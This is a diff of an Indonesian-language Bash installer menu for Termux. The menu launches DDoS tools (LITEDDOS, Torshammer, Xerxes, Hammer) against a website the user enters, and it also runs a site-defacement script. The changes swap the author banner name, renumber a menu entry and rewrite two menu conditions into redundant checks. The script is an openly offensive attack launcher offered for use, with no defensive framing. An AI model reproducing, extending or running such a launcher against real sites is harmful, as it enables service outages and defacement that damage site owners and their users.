@@ -10,7 +10,7 @@ cyan='\033[36;1m'
 red='\033[31;1m'
 white='\033[37;1m'    
 
-figlet Dfv47 | lolcat
+figlet Bahauddin | lolcat
 echo $cyan"Membuat Tools Instaler Sendiri Di Termux"
 echo $green"Daftar Toolsnya=>"
 echo $purple"[1] DDOS Website Dengan LITEDDOS"
@@ -18,7 +18,7 @@ echo $purple"[2] DDOS Website Dengan Torshammer"
 echo $purple"[3] DDOS Website Dengan Xerxes"
 echo $purple"[4] DDOS Website Dengan Hammer"
 echo $purple"[5] d1"
-echo $purple"[4] d2"
+echo $purple"[6] d2"
 echo
 echo $green
 read -p "╭─[Pilih Nomer]
@@ -68,7 +68,7 @@ read -p "[masukanWebsiteTarget]>" target
 ./xerxes target 80
 fi
 
-if [ $bro = 4 ] || [ $bro = 5 ]
+if [ $bro = 4 ] || [ $bro = 4 ]
 then
 clear
 echo $green" Installing Hammer DDOS.."
@@ -94,7 +94,7 @@ cd $HOME/iesDEFACE
 bash iesDeface.sh
 fi
 
-if [ $bro = 6 ] || [ $bro = 7 ]
+if [ $bro = 6 ] || [ $bro = 6 ]
 then
 clear
 echo "\033[34;1m"
